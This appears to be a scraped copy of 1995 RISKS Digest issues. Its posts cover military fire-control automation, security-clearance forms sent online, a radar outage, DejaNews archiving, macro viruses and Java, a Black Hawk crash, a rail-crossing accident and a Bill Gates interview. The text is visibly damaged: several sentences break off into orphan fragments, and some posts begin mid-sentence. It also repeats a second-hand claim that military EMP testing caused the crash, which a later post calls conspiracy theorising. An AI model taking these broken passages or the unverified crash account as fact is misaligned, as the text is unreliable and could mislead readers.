I suspect that the Internet is rapidly returning to that paradigm.

<P>
On page 24 of the October 16, 1995, issue of PC Week, an article ("Mark your
target--objects in the field) describes how the U.S. Army with Magnavox
Electronic Systems is designing an AFATDS (automated field artillery
tactical data system) which can use battlefield intelligence data in
conjunction with programmed standard operating procedures to direct
artillery file onto enemy forces in a matter of seconds.
<P>
The development of an AFATDS should come as no surprise to anyone familiar
with the military.  The U.S. armed forces have historically relied upon fire
support such as artillery to reduce enemy forces and so reduce the number of
American casualties.  In addition, the military is downsizing and so has to
"do more with less".  By automating the control of artillery fire, the
military is hoping to literally get "more of a bang for the bucks".  A
well-designed functioning AFATDS has the possibility of being a critical
"force multiplier" which could deter "enemy" forces from even tangling with
U.S. forces.
<P>
However, as readers of this digest are aware, there are two main dangers
from automating such a process to the point where there is little room or
time for human control of the system.  First, there is the problem of
intentional sabotage.  I would not put it past the capabilities of an
"enlisted hacker" to spoof the AFATDS into mistaking the Officer's Club as a
concentration of enemy troops.  AFATDS could give a "fragger" the chance to
do a lot more damage than he/she could do just using a grenade or gun.
<P>
Second, there are the problems of unexpected software bugs which could
misdirect fire or even abend the entire system.  Given that the consequences
of either misdirected artillery barrages or losing artillery support
altogether could literally be a matter of life or death, it would be
interesting to find out how Magnavox plans to deal with these problems.
<P>
This is more than just a theoretical topic since it is possible that AFATDS
could be implemented as soon as next year according to the article.

I'm going in for a top-secret clearance, and was talking to the person who's
responsible for sending off the paperwork.  She's excited: seems that you
can now submit the forms over the Internet, thus saving the need to send
stacks of paper.  You obviously don't sign the form (no digital signature
capability); at some point in the future they said I'll be asked to sign a
hardcopy.
<P>
I suggested that it made me uncomfortable to have all that personal
information being sent over a public net without any form of protection, so
they agreed to submit mine on paper.
<P>
The risks of sending any sort of confidential information over the net have
been described to death, so there's nothing new.  It just amazes me that the
U.S. government office responsible for handing out clearances could be so
unaware of the risks as to allow it.  Further, as holding a clearance is
generally something that's not supposed to be discussed except for those
with a need to know, it seems odd that they would be willing to accept the
information leading to a clearance over a public network.
<P>
P.S. For those who haven't had the pleasure of applying for a clearance,
among the information they ask for is where you've lived, worked, been
married to, travelled to; also any treatment for psychiatric conditions, use
of drugs, criminal record, organizational memberships, communist party
affiliation, etc.  So there's plenty there that some people might not want
posted on bathroom walls.

Three-minute outage blanks approach radar at McCarran
<P>
* A union official contends equipment at Las Vegas' airport is
outdated, but an air traffic official disagrees.
<P>
by Keith Rogers, *Las Vegas Review-Journal*, 19 Oct 1995
<P>
Three air traffic controllers who were tracking aircraft approaching
Las Vegas experienced a 3 1/2-minute radar outage Tuesday night, raising
concerns with their union that it's time for new equipment.  But Paul
Strybing, assistant air traffic manager at the Las Vegas Terminal Radar
Approach Control, said, "At the time this took place, we had five other
radar displays that continued to operate fully.  At no time was there any
loss or disorientation of traffic."
<P>

In a statement Wednesday, Daniel Maddaus, president of the National Air
Traffic Controllers Association Local-L30, the union that represents
controllers for the Terminal Radar Approach Control, said, "This outage
lasted long enough for an average air carrier to travel about nine to 10
miles unseen by air traffic control."  The Las Vegas approach control
handles aircraft up to an altitude of 17,000 feet within a 40-mile radius of
McCarran International Airport.  "The likelihood of a midair collision
zooms," Maddaus said [...].  "You have aircraft pointed at each other with
minimal separation."
<P>

Three of the five controllers working that shift were affected by the
outage and were able to switch to other radar screens, Maddaus said, but,
"the problem I have is the equipment is old and prone to more failures."<BR>
[...]  "The flying public pays for the most complex air traffic control<BR>
system in the world.  What they are getting is a very large bureaucracy and
1950s and '60s technology."
<P>

Strybing said the radar system is 1970s technology "and continues to
work extremely well."  "It's an extremely reliable system that has the best
track record of any system configuration of its kind in the world.  There
are redundancies and backups."  The outage at 10:02 p.m. Tuesday to what is
called the Multiplex Display Buffer Memory lasted 3 minutes, 21 seconds and
caused three radar screens to go blank, Strybing said.  [...]

What this experience tells me is that if a customer service rep tells

else.  Your service does depend on the person serving you, not just

Actually, the information is far from secret. Any bright 13-year old with an

So it's pretty obvious that both connectivity along the rails, and *between*

In <A HREF="/Risks/17.40.html">RISKS-17.40</A>, Sean Reifschneider notes that some modern disk drivers
intended for portables have extensive error management built in, and asks
"but how does it report the problems."
<P>
All SCSI devices can implement an extensive error logging command protocol
defined in the ANSI SCSI Standard (ANSI X3-131-1994), including commands to
initiate self-test sequences and commands to report errors.  Presumably, the
device's manufacturer would provide a vendor-specific utility to monitor the
device. In the Macintosh community, there are several very competent
third-party disk driver vendors who are certainly technically capable of
writing this utility.
<P>
My experience, however, is that modern SCSI disks are extremely reliable,
and there isn't much cost/benefit in doing this: remember, the personal
computer user community does not -- and should and should not -- need to
know about technical details within their computer systems. Here, a
comparison with modern computer-infested automobile control systems seems
relevant: how often do you want to examine the engine logs?

I read Prentiss Riddle's comments on the risks of Java with considerable
interest. This seems to me to be one example of a larger problem that seems
worthy of considerable discussion in Risks. The Microsoft Word viruses that

document can contain a "macro" that executes when the document is opened.
Someone finally realized that this macro can do something nasty to the
unsuspecting recipient of the document.)
<P>
The more general concept that many folks are propounding is that we will
regularly exchange "objects" containing both data and code by mechanisms
such the World Wide Web and various kinds of object request brokers. The
broader supposition seems to be that the concepts of applications and data
files as we know them will disappear.

I've been viewing this with growing alarm for some time. It seems to me that
if all this does happen, it will be possible to turn all sorts of nasty

There will be a six-paper minitrack on Risks in End User Computing at the
Twenty-Ninth Hawaii International Conference on System Sciences in January,
1996.  Most of the papers will focus on spreadsheet risks and spreadsheet<BR>
errors.
<P>
Three of the papers are available online.  If you are interested, please use
the following URL.

<P>
You can also access these papers through links in my home page, which is
listed below.
<P>
The papers add to past findings.  Wherever quantitative errors have been
studied in spreadsheeting, they have been found in disturbingly high
numbers.  Galletta et al.'s paper extends this to the debugging phase.  In
addition, controls on spreadsheeting and end user computing are at best
informal.

<P>
Sometime during the middle of September, I saw a report on CNN on a
barely averted atomic explosion of Russian nuclear submarines: Under the
communist regime, the Russian army was supplied with electricity, benzine,
gas, raw materials, and all other "necessary" materials that did not require
special attention, such as high-tech programs and "exotic" high-cost needs.
Since the collapse of communism, though, and the arrival of privatization,
the soviet administrative structure was changed, and now the army has to pay
for these services out of the military budget. This means that now also the
army gets an electric, gas, and what-not bill.
<P>

I am not clear on this, but it sounds reasonable, and fits well with
the story (If anyone knows better, please correct me), but as far as I
understand, when in dock, a nuclear submarine relies on outside power to run
all its needs, including the reactor cooling systems.
<P>

Enter our story: In a Russian military base, in the south of Russia,
I don't remember the exact site, a Russian base commander was forced to send
armed troops to the nearby power plant to force the local power company to
turn the juice back on at gunpoint.
<P>

The power company shut off the military's power supply on account of
the huge unpaid bill (I think it was somewhere in the order of $ 2-3
million). The sub's cooling systems failed, and the reactors began to
overheat. A nuclear explosion was closely averted.
<P>

I know there are a few flaws in the story, such as why didn't the
subs start cooling on internal power, and why did the company not give any
notice before shutting off the current (which would have sent the military
screaming at them, but then again they might have thought the power company
would never do such a thing), but that's roughly the way it was reported on
CNN.

Internet Services Accused of Privacy Violations<BR>
[This appeared in *The Boston Globe*, 23 Oct 1995.]
<P>
(C) 1995, Simson L. Garfinkel<BR>
Simson L. Garfinkel, Globe Correspondent
<P>
An Internet service that catalogs and indexes messages from electronic
bulletin boards is drawing criticism for possibly violating the privacy of
the network's users.  DejaNews Partners taps into the Usenet global
electronic bulletin board network, makes a copy of every message, and stores
and indexes them for easy public retrieval. The service has quickly become
the fastest and most powerful way for savvy Internet users to find answers
to questions, locate lost friends, or even take the pulse of the wired
public.
<P>
Executives at San Antonio-based DejaNews seem perplexed at the near daily
messages they receive from computer users who complain that what the company
is doing amounts to an invasion of privacy.  "When you post to Usenet, it
automatically gets propagated to tens of thousands of computers,'' said
Steve Madre, president of DejaNews Partners.  ``So anybody who posted
something to Usenet and then later on has any kind of privacy concerns about
it must have seriously misunderstood what they were doing."
<P>
But it's not just DejaNews' archival retrieval system that has some
cybersurfers worried. It is the fact people are unaware their messages are
being archived and, perhaps even more insidious, the program's ability to
form user profiles of people who post messages -- grouping them by the
specific subject matter on which they most frequently correspond.
<P>
``No one ever mentioned to me that it was possible to take a different
program and run a search on what you've written,'' says Peter Crone, a local
graphics designer who reads Usenet through his account with The Internet
Access Company, of Bedford. ``Maybe this is as obvious as the sky being blue
to techies, but this is the first I've heard of it.''  According to
Dejanews, Crone posted three articles to the Usenet between July 27, 1995
and September 2, 1995, to the user groups "rec.arts.startrek.current,"
"rec.arts.sf.tv" and "rec.arts.sf.starwars."  Thus, simply by looking up
Crone's name on DejaNews, it is possible for anybody on the Internet to
conclude that Crone is a science fiction buff, and that he likes Star Trek
and Star Wars.  ``It feels a little like a phone tap or something,'' says
Crone. The Usenet system is divided into more than 10,000 such special
interest ``groups,'' each with their own self-descriptive name, such as
"rec.autos.makers.saturn," for Saturn car lovers, and<BR>
"alt.politics.usa.republican," for devotees of the Republican National
Party.
<P>
Unlike the World Wide Web, which uses the Internet to move pages of
information when requested to do so by a user, the Usenet is based upon
older technology which actually copies every message to tens of thousands of
computers throughout the world. The typical Usenet server has a billion
bytes of storage, holding hundreds of thousands of messages at a time. To
keep up with the flood of new messages, organizations usually program their
Usenet servers to delete old messages after a few weeks.
<P>
But DejaNews follows a different strategy: instead of deleting old messages,
the company archives the messages, becoming a kind of Internet memory bank.
The company hopes to support its free service by selling advertising space.
<P>
Using DejaNews, it is easy to search for every message posted on the net on
a particular subject. For example, searching for the name "Warren Buffett"
recently returned a list of 20,862 different messages, most from the Usenet
group "misc.invest.stocks." You can locate an old friend by searching for
all of the messages transmitted over the network that mention the friend's
name.
<P>
But DejaNews also has a sophisticated system for retrieving "author
profiles" of the individuals who have posted messages. Using this system,
it's easy to retrieve a list of every group in which a particular person has
posted a message -- or even the messages themselves.
<P>
Amy Bruckman, who is a graduate student at the MIT Media Laboratory and sits
on the MIT Presidential Advisory Committee on Privacy, says that her concern
with DejaNews is that most people using Usenet are not aware of the
service's existence.
<P>
But Usenet has actually been archived for a long time. Many schools, for
example, have backup tapes containing Usenet messages dating back many
years. Furthermore, says Madere, the National Security Agency and possibly
other law enforcement or intelligence organizations has been
cross-referencing and indexing Usenet for quite some time. "I know for a
fact that they do have a text retrieval database which contains Usenet,"
says Madere.  Creating a searchable index of Usenet " was already done for
what people might consider to be sinister purposes," says Madere. "What we
have done is made it searchable for useful purposes."
<P>
But Bruckman says that building comprehensive author profiles represents a
further invasion beyond simply allowing searches by keyword. "There are
different levels of invasiveness of technology. Being able to record data is
one level. Being able to correlate it is another. That's why social security
numbers are such a problem -- because they make it easy to correlate large
amounts of disparate data about a person."
<P>
More people might start feeling the same way later this year, when DajaNews
starts indexing Usenet groups such as ``talk.abortion,'' in which people
exchange political opinions about abortion, and ``alt.sex.incest,'' where
people trade stories of sexual abuse. Currently, says Madere, DejaNews does
not index any Usenet group whose name begins with the letters alt, talk or
soc, although it plans to do so as soon in the near future. DejaNews can be
reached at <A HREF="http://dejanews.com/">http://dejanews.com/</A>.

[Alan Tignanelli on ATC]<BR>
&gt; Because of the frequency of the outages, the FAA is considering UPS.
<P>
I'm horrified.
<P>
I wouldn't consider leaving a safety-critical computer without some kind of
power failure protection. All our servers here are UPS-protected, and the
worst that can happen is we might lose a day's work if we have to go back
to backups because a disk failed due to an outage. Hell, I've even got an
UPS on my personal computer at home.
<P>
Maybe I'm oversensitized because I'm in the real-time industry. Maybe it
really is rocket science... but hey, these guys are *supposed* to be rocket
scientists.
<P>
Surely this is a misunderstanding, and they *were* on an UPS and the UPS
went down.
<P>
[Martin Minow on diagnostic software]<BR>
&gt; My experience, however, is that modern SCSI disks are extremely reliable,<BR>
&gt; and there isn't much cost/benefit in doing this: remember, the personal<BR>
&gt; computer user community does not -- and should and should not -- need to<BR>
&gt; know about technical details within their computer systems. Here, a<BR>
&gt; comparison with modern computer-infested automobile control systems seems<BR>
&gt; relevant: how often do you want to examine the engine logs?
<P>
Whenever I take the car to the garage, I would hope the logs would be
examined. Since a laptop isn't taken to the mechanic, the operating system
should be performing this job for me.
<P>
[and Charley Wertz on trojan horses]<BR>
&gt; Am I missing something?
<P>
I don't think so.
<P>
&gt; Does anyone have some good solutions?
<P>
Designing languages so they're inherently safe. For example, if there is
no "open file" primitive in the language, it can't be used to modify files.
Sun has a *separate* development going on based on a language called Tcl.
The original version of Tcl had no file I/O of note, it was purely an
extension language. I wrote some file I/O routines, and they have been
pretty much incorporated straight into the language... but they're not
integral to the operation of the interpreter. There's a variant called
Safe Tcl that's dropped back to the extension language model.

<P>
David identifies two main risks, both of which I feel are overstated
<P>
&gt; AFATDS could give a "fragger" the chance to<BR>
&gt; do a lot more damage than he/she could do just using a grenade or gun.
<P>
Very few safeguards exist today against a determined "fragger".  In my
former job as a tank commander, I could have easily killed hundreds of
people while on a live fire range before my crew could have stopped me.
<P>
The only real safeguard you can take for artillery is to have multiple
people work out the solution: this is already done in peacetime on
live-fire ranges.
<P>
&gt;Second, there are the problems of unexpected software bugs which could<BR>
&gt;misdirect fire or even abend the entire system.  Given that the consequences<BR>
&gt;of either misdirected artillery barrages or losing artillery support<BR>
&gt;altogether could literally be a matter of life or death.
<P>
Bugs are always a problem, however, all artillery units currently use
digital fire control computers.  The software has been well tested, but I
doubt that it's bug free.
<P>
The US Army in general is very good about having backup systems.
Currently, artillery units are equipped with the BUCS- BackUp Computer
System, which looks much like a modified HP calculator.  Slower and harder
to use, but still there.  In addition, artillery folks are trained in pure
manual tables as well, although I don't know how much they practice with
them.
<P>
(For those who are curious, a lot of the live fire exercises Armor units
practice on are in "degraded mode", simulating failure of fire control
computers, stabilization systems, rangefinders, etc..  Very smart, IMHO)
<P>
Assuming this is the software that I've read about elsewhere, I'd push
heavily for this to be fielded ASAP.  Why?  Mainly because it has links
into positioning equipment such as GPS and inertial systems.  Getting lost
in the desert/woods is an _enormous_ problem, and trying to direct
artillery fire when either the observer or the arty unit is in the wrong
place invites disaster.  I'd feel a lot more comfortable if everyone knows
where they are, even with occasional software bugs- those can at least be
fixed ahead of time.

Sidney Markowitz &lt;<A HREF="mailto:sidney@atg.apple.com">sidney@atg.apple.com</A>&gt; said:
: ... I have to wonder if [the recent story of a female exec's video<BR>
: email blunder] is ... urban myth. [Technical objections deleted]
<P>
Mr. Markowitz might be surprised at what can be done with computers made by
his own company.  Connectix makes a $99 b/w video camera (the QuickCam) for
MacIntosh.  It plugs into the serial port of a Mac, needs no additional
hardware, and comes with a large number of support applications.  It can be
used to capture video or still images for attachment to mime encoded email,
or (with Columbia University's "CU See Me") to videoconference over a 14kb
slip or ppp connection.  I use mine on a Powerbook 165c.
<P>
In fact, a similar event occurred to a friend of mine, the webmaster at
<A HREF="http://www.cliq.com">http://www.cliq.com</A>.  Cliq is located in one of the bedrooms of a
co-operative house one block from the Haight/Ashbury intersection in San
Francisco, and for a time they ran the "HaightCam", serving live digital
stills of Haight/Ashbury taken with a QuickCam on a Mac iici.
<P>
My friend, while prototyping the HaightCam server, left it pointed out from
his desk.  His bed was in the background.  One Sunday morning I was browsing
the site, and was surprised to find out more than I cared to about his
success at romance.  Shortly thereafter, the HaightCam was permanently
mounted where it would point out over the street. &lt;grin&gt;
<P>
The point is that, with cheap digital input devices and powerful data
broadcast techniques available to everyone, one never knows when one
is in private and when one's likeness is being broadcast.  Video cameras
are not new; the coming ubiquity of live broadcasting digital cameras
is.

only a couple of miles from the crash site, and this was really big in
our local news. This is not a hoax or urban legend, the crash did
occur.
<P>
[DISCLAIMER.... I have no first hand information pertaining to the crash,
however I will summarize the points made in an ongoing series of articles
published in our local newspaper, the Maryland Independent. This series ran
a year or so ago, and my memory may be somewhat faulty. Again, I'm only
summarizing published newspaper reports...]
<P>
An amateur archeologist, (Mr. Owens?) was performing exploration of indian
ruins in a remote area in southern Maryland along the Potomac river near
Harry Diamond Research Labs (A highly secure government facility), and he
observed the crash. This individual observed the helicopter hovering
normally just above the tree tops, and then suddenly go down. He was the
first individual at the crash scene (within several minutes of the
incident), and he stated the there were serious cut injuries to the one of
the pilots legs, but that the wound had little or no bleeding, and their
skin had a yellowish cast as if burned, but that there had been no fire. He
also stated that none of the injuries he noted looked as if they would have
been fatal in the short time it took him to reach the crash scene.
<P>
Charles County deputies and rescue squad individuals responded and secured
the site, taking photographs. Some time later, military personnel arrived and
confiscated all evidence and requested that all civilian personnel leave the
accident area.
<P>
As background, the military allegedly did EMP (Electromagnetic Pulse)
testing at the Patuxent River Naval Air Station in nearby St. Mary's county
Maryland in the early 80's. This testing was supposedly moved but moved to a
location in Woodbridge, Virginia after complaints that this type of testing
was very risky, because the Calvert Cliffs Nuclear Powerplant is only a
couple of miles from PAX river NAS, and concerns of EMI possibly affecting
the plants electronic control systems were realized. (How's that for a
risk?)
<P>
After supposedly moving to the Woodbridge facility, the government began
receiving pressure to relocate the facility from Woodbridge, because
civilian aircraft on approach to National Airport (just up the Potomac river
from Woodbridge) were having EMI problems with navigation equipment.  It is
believed that this project was then moved across the Potomac river to Harry
Diamond Labs, close to the accident scene. (HD lab has very tight physical
security, and is in a relatively rural area) Historically, HD labs has been
involved in high security defense related research projects. The military
currently states claims that this project has now been relocated to New
Mexico, and will make no comment on the conjecture that it ever was ever
based at Diamond Labs.
<P>
The military officially reported that a pin in the helicopter had been
installed backwards, and that was the cause of the crash. However, when
interviewed, the helicopter mechanic stated the pin was not installed
incorrectly, and his supervisor also stated that he was present during the
pin installation and it was performed correctly. Other helicopter mechanical
experts interviewed stated that if this pin was installed "backwards", that
failure should have occurred on the ground during the warm up period within a
minute or two of start up. The Black Hawk had supposedly been aloft for more
than 20 minutes, and had flown across the Potomac river, at least 7 miles
from it's base.
<P>
After Mr Owens began questioning official reports blaming the pin
installation as the cause of the crash, the military supposedly became quite
uncooperative with Mr. Owens and others interested in the crash.
<P>
Other points noted in the article.
<P>
No disciplinary action occurred to the helicopter mechanic who supposedly
incorrectly installed the pin, causing loss of life and aircraft. In a
case where loss of life occurs due to negligence, some type of
disciplinary action usually occurs.
<P>
The yellowish cast of the pilots skin and lack of any blood due to
internal coagulation was reported to be consistent with severe microwave
burns.
<P>
The attitude of the military pertaining to crash details changed
considerably when the issue of EMP testing as a possible cause of the
crash was raised by Mr. Owens and the families of the individuals lost
in the crash.

Although many others have brought several aspects of this report into
question, with the suspicion that it is nothing more than conspiracy
theorising with no substantial base whatsoever, one issue has not been
addressed.  To me, it appears to be the most obvious one :
<P>
How come an *archaeologist*, only present at the scene of the accident by
chance, seems to know so much about the design of military aircraft and the
investigative procedures used in aircraft crashes ?
<P>
In the true spirit of conspiracy theory, should we not assume that since
Mr Owens (assuming that that such a person exists) was so conveniently near
to hand at the time of the accident that he is in some way related to it ?
<P>
Could it not be that he is in the employ of the people that *really* caused
the crash, and is masquerading as an innocent bystander who embarks upon a
baseless but nevertheless high-profile crusade about Army helicopters and
EMI, in order to distract attention away from the real cause ?

<ADDRESS>
&lt;&gt;
</ADDRESS>
<I>24 October 1995</I>
<P>
Periodically I will remind you of TWO useful digests related to privacy,
both of which are siphoning off some of the material that would otherwise
appear in RISKS, but which should be read by those of you vitally interested
in privacy problems.  RISKS will continue to carry general discussions in
which risks to privacy are a concern.
<UL>
<LI>The PRIVACY Forum is run by Lauren Weinstein.  He manages it as a rather
selectively moderated digest, somewhat akin to RISKS; it spans the full
range of both technological and non-technological privacy-related issues
(with an emphasis on the former).  For information regarding the PRIVACY
Forum, please send the exact line:
<P>
information privacy
<P>
as the first text in the BODY of a message to:
<P>
<A HREF="mailto:privacy-request@vortex.com">privacy-request@vortex.com</A>
<P>
You will receive a response from an automated listserv system.  To submit
contributions, send to "<A HREF="mailto:privacy@vortex.com">privacy@vortex.com</A>".
<P>
Information and materials relating to the PRIVACY Forum may also be
obtained via ftp to "ftp.vortex.com", gopher at "gopher.vortex.com",
and World Wide Web via: "<A HREF="http://www.vortex.com">http://www.vortex.com</A>".
<P>
<LI>The Computer PRIVACY Digest (CPD) (formerly the Telecom Privacy digest) is
run by Leonard P. Levine.  It is gatewayed to the USENET newsgroup
comp.society.privacy.  It is a relatively open (i.e., less tightly moderated)
forum, and was established to provide a forum for discussion on the
effect of technology on privacy.  All too often technology is way ahead of
the law and society as it presents us with new devices and applications.
Technology can enhance and detract from privacy.  Submissions should go to
<A HREF="mailto:comp-privacy@uwm.edu">comp-privacy@uwm.edu</A> and administrative requests to
<A HREF="mailto:comp-privacy-request@uwm.edu">comp-privacy-request@uwm.edu</A>.
</UL>
There is clearly much potential for overlap between the two digests,
although contributions tend not to appear in both places.  If you are very
short of time and can scan only one, you might want to try the former.  If
you are interested in ongoing discussions, try the latter.  Otherwise, it
may well be appropriate for you to read both, depending on the strength of
your interests and time available.

<P>
*The New York Times* (22 Oct 1995) carried a frightening article on some new
air pollution control technology that's being tried out in California.  It
seems that Federal regulations require that all 1996 model cars have sensors
to notify drivers if the pollution control mechanisms aren't working; if
there's a failure, it's supposed to be repaired right away.  But what if the
motorist decides not to bother?
<P>
The California Air Control Board has decided it would be a good idea to hook
these sensors up to a transponder, very similar to the ones to be used by
toll readers.  Every time you drive by a transmitter, it sees if your car's
emission control system is working properly.  If not -- well, you'll be
mailed a notice for starters, though the article noted the possibility of
summonses, denial of registration, etc.  An experiment is underway.
<P>
Naturally enough, civil liberties groups and automotive manufacturers are
not fond of this whole scheme.  But the board sees it as a ``perception
problem'' -- and the public will love it once they see how ``convenient'' it
is.  Meanwhile, other states are watching, since California has
traditionally led the nation in pollution control laws.
<P>
I'm not sure any more needs to be said here.  Even if the system works
exactly as designed, it's a frightening concept.  I leave it to the readers
of this digest to consider how many new and creative failure modes a system
like this can generate -- and how easily it could be abused...

<P>
The reliability of Pittsburgh Airport is a recurring subject in RISKS, and
as other readers have pointed out, it is not alone. Well, I have a new one
for you: Sydney Australia.
<P>
We have recently had a third runway built (amid much controversy, but that's
by the by) and so the control tower had to be moved again. A large
international telecommunications company contracted to supply and install
a state-of-the-art computer controlled voice-switching system using a
combination of off-the-shelf hardware - mainly PC's running DOS. What
they didn't tell the airport authority (which has problems of it's own)
is that they hadn't even built a prototype of the system.
<P>
In a nutshell, it's bad, really bad. I'm a hazy on the details because I
have it second-hand - a relative of mine is one of a score of people
expected to support this thing, but none of them has the right background
nor the right training and he's leaving in a week, anyway.
<P>
The new tower is at least six months overdue and is far from being fully
functional. Apparently someone is running a book on when it will finally
be fixed; general consensus is about April next year: more than a year late.
<P>
The RISKS? Oh, that's easy. An untested design; ignorant support staff;
and the politics of the authority. At least the risk to human life will
be on the Ground, not in the Air (small comfort, I know). But at least you
now know why flights will have trouble landing at Sydney!

<P>
Investigators from the National Transportation Safety Board and other
agencies looking into the tragic crash of a commuter train with a school bus
near Chicago (at this writing, seven students are dead), report very
preliminary findings regarding the traffic light and railroad signaling
integration.
<P>
Early news reports indicated that the system may have malfunctioned.
<P>
More troubling, however, is the apparent finding that the system
was working properly, but under such severe real-world restraints
that it was arguably incapable of performing its designed task.
<P>
Reportedly, a track sensor placed 1/8 miles away (~20 seconds at
70 mph) activates the traditional flashing lights and bells and<BR>
after a short delay the gate.  It simultaneously notifies the
adjacent traffic light controller that it needs to cycle into
a position where traffic that is possibly backed up (or just too
long for the short stretch of street, as this bus was: 38+ feet
on 32 feet of pavement behind the white line) may proceed on a
green light.  Sounds sensible enough.  However:
<UL>
<LI> the first step is to flash the DON'T WALK light
<LI> next, steady DON'T WALK and yellow on the cross traffic
<LI> sufficient stopping time allowed for 40mph+ traffic
<LI> red on cross traffic
<LI> delay for red-light-blasters
<LI> and only then may a green light appear.
</UL>
Under optimal conditions, the bus may have had a maximum of 2
seconds to proceed.
<P>
Clearly, a nexus of several risks, not limited to those of the failure of
computer systems, but encompassing the human factor (and "sensibly" allowing
for mistakes and intentional rule-breaking), the combination of several
mission-critical tasks (get pedestrians out of way, etc.), and the crossing
of several different modes of travel (commuter trains, pedestrians, local
traffic, and commuter i.e. through traffic).
<P>
The question here is very nearly not why did the system fail? but
why did it take so long to fail?

In the 1970s I worked with a "safe" Fortran implementation designed to be
used by students. It prohibited access to anything except a small subset of
operating system services to prevent students from causing problems with
the system.
<P>
I found that I could put machine language code in named COMMON sections and
then call them as subroutines, letting me get around the restrictions built
into the language.
<P>
The risk is in assuming that all implementations will be bug free and that
all routes to circumventing the restrictions of the language will be
anticipated and correctly designed around.

<P>
In an interview for German weekly magazine FOCUS (nr.43, October 23,1995,
pages 206-212), Microsoft`s Mr. Bill Gates has made some statements about
software quality of MS products. After lengthy inquiries about how PCs
should and could be used (including some angry comments on some questions
which Mr. Gates evidently did not like), the interviewer comes to storage
requirements of MS products; it ends with the following dispute (translated
by submitter; at some interesting points, I added the German phrase):
<P>
Focus: But it is a fact: if you buy a new version of a program to
overcome faults of an old one, you unavoidably get more features
and need more storage.
Gates: We have strong competitors and produce only products which we
believe to be able to sell. New versions are not offered to
cure faults. I have never heard of a less relevant reason to
bring a new version on the market.
<P>
Focus: There are always bugs in programs.
Gates: No. There are no essential bugs ("keine bedeutenden Fehler") in
our software which a significant number fo users might wish to
be removed.
<P>
Focus: Hey? I get always crazy when my Macintosh Word 5.1 hides
page numbers under my text.
Gates: Maybe you make errors, have you ever thought about that? It
often appears that machine addicts ("Maschinenstuermer") cannot
use software properly. We install new features because we were
asked to. Nobody would buy a new software because of bugs
in an old one.
<P>
Focus: If I call a hotline or a dealer and complain about a problem, I have
to hear: `Get the update to version 6`. Everybody has such
experiences. This is how the system works.
Gates: We pay 500 million $ a year for telephone advice. Less than 1% of
calls which we get has to do with software bugs. Most callers wish
advice. You are kindly invited to listen to the millions of calls.
You must wait for weeks until one complains about a bug.
<P>
Focus: But where does this feeling of frustration come from which unites
PC users? Everybody is confronted every day that programs do not
work as they should?
Gates: That is talking, following the motto: `yes, I also know about this
bug`. I understand this as sociological phenomenon, not as
technical.
<P>
The RISK? While there is NO risk that experienced users believe Mr. Gates,
there are 2 serious ones: first, that politicians (who rarely experience the
lowlands of PCs but develop their "political visions" from their
unexperience) may believe him. Second and worst: that Mr. Gates and his
enterprise believe what he is saying, and act accordingly :-)
<P>
Maybe someone can inform Mr. Gates that it was HIS enterprise which recently
distributed the first Macro virus WordMacro.Concept on a CD-ROM to OEM
customers, in July, and to participants of a Windows 95 seminar in Germany,
in September); but indeed, this is NOT a BUG BUT an ATTACK on unaware users :-)
According to a German saying those whose reputation is corrupted may live free
and easy ("Ist der Ruf erst ruiniert, lebt sich's doppelt ungeniert!")

</ADDRESS>
<I>Fri, 27 Oct 1995 11:42:19 -0600</I>
<P>
It's currently fashionable to say that the 'net is a social anarchy,
and at the newsgroup level it is to a large extent.  But under this
level is the technical and social contracts which allow the Internet
to function as a quasi-cohesive whole.
<P>
Anyone familiar with the role of RFCs and the old ARPAnet gods knows
what I'm referring to.
<P>
Recently, I've encountered a situation which suggests that the social
contract of the technical level of the internet is breaking down, and I am
hereby making a dire prediction of a growing problem with a problem I shall
call "SMTP chicken," to be described below.
<P>
First, background on the social contract:
<P>
In brief, I made a response to several technical articles in a sci
group.  The next morning I found a response to such article with what
I consider extremely juvenile rejoinders for a sci newsgroup.  Yet all
articles and messages were signed with a company name and the job title
of "Principle Scientist."
<P>
Naturally, I wondered if this might be some soon-to-be-ex student
employee or the like giving himself a backdoor promotion, or if this
might possibly be a legitimate expert who was simply speaking outside
of his field of expertise or who misunderstood the original question.
So I exercised my rights under the social contract dating back to the
first mail protocols on ARPAnet and politely asked his postmaster to
verify this individual's job title.
<P>
In response I got a scorching letter accusing me of "wasting gov't
resources and time," claiming that a fax complaint had already been
sent to the Inspector General's office, and demanding that this
complaint be filed in my permanent record.
<P>
(My offense was apparently that, while I posted all articles from my
academic account on my own time, I sent the one-line query to postmaster
from work as I caught up with my morning mail.)
<P>
Subsequent investigation shows that all further mail to "postmaster"
is autoresponded with a "go away, you're bothering me" message and
a suggestion that people who are really desperate to chat contact
him through snail mail.
<P>
This autoresponse is a direct violation of one of the most critical roles
of postmaster - to be a human being who can be contacted in case that mail
system starts causing problems to the rest of the world.  If his system
starts flooding the net with bogus mail, nobody has any way of contacting
him... and that's critical in eliminating games of SMTP chicken.
<P>
(The other role of postmaster is to verify user information at the remote
site, an obvious need in the early days of the net before the implementation
of "finger" and WWW home pages.  Even today it is still a useful function to
verify, for instance, that the "legal counsel" who is demanding you remove a
copyright violation really is a lawyer with the authority to make such a
demand on the behalf of the client... or to even understand if a copyright
violation even occurred.)
<P>
Further investigation revealed that this "company" is actually a system
running common Windows nettools (Eudora for mail, Forte Agent for news) and
connected via a SLIP connection to a local ISP.  As mentioned, the "company"
is not listed in the phone book (at least, not under the name provided), and
the sole name and address provided matches that individual's publicly listed
residential address.  For whatever reason, this person had elected to pay
the additional fee to get DNS (or at least MX) service rather than using in
address under the ISP's address space.
<P>
The problem, of course, is that since he (and not the ISP) receives
mail sent to postmaster he is bound to the technical and social contracts
for the interoperation of the 'net.  The technical contracts are no
problem -- the software and his ISP ensure that these standards are
met.
<P>
But apparently this (and all?) ISP didn't bother with the standard
sysadmin/postmaster lecture to the people requesting DNS service.
"After all," they might argue, "it's only a PC so how much harm can
they do?"
<P>
This brings us to the game of "SMTP chicken."
<P>
Let's assume that we have _two_ people with such autoresponders (and
I've heard of several such autoresponders already being placed on the
'net.)  One person could innocently respond to the other person's
posted comments and immediately create a mail loop.
<P>
Each time through the system the mail will grow by a few lines, as
each quotes the original material and adds a few lines proclaiming
that it ignores unsolicited mail.  Then it's off to the other side
for _it_ to respond to.
<P>
Since the autoresponders (probably) won't save such messages, neither
individual would be aware that their mail message has grown to a
monster of 1000, 2000,... 10,000,... a million?! lines.  It will be
like the ISP systems are playing a game of chicken, and whoever has
a SMTP daemon with a lower limit on the size of a mail message loses.
(It's also possible that the mail would be forwarded to each PC, but
with POP it might be possible to locate autoresponders on the ISP
node.)
<P>
It's an interesting question in probability.  If you have N PPP/SLIP
